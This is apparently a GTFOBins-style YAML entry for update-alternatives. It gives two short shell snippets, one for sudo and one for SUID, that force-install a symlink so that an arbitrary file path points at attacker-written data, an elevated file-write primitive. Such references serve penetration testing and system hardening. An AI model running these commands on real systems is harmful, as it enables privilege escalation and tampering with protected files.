---
functions:
  sudo:
    - description: Write in `$LFILE` a symlink to `$TF`.
      code: |
        LFILE=/path/to/file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        sudo update-alternatives --force --install "$LFILE" x "$TF" 0
  suid:
    - description: Write in `$LFILE` a symlink to `$TF`.
      code: |
        LFILE=/path/to/file_to_write
        TF=$(mktemp)
        echo DATA >$TF
        ./update-alternatives --force --install "$LFILE" x "$TF" 0
---
